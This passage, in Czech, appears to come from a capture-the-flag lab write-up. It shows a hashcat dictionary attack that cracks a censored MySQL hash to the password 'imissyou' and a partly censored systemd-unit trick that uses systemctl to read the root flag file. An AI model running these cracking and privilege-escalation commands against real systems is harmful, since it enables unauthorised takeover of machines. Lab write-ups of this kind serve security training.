### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`hashcat --force -m 300 -a 0 "__CENSORED__" /usr/share/wordlists/rockyou.txt`
```
=> __CENSORED__:imissyou
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`Type=oneshot`
```
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
__CENSORED__
WantedBy=multi-user.target' > $TF

systemctl link $TF
systemctl enable --now $TF
```
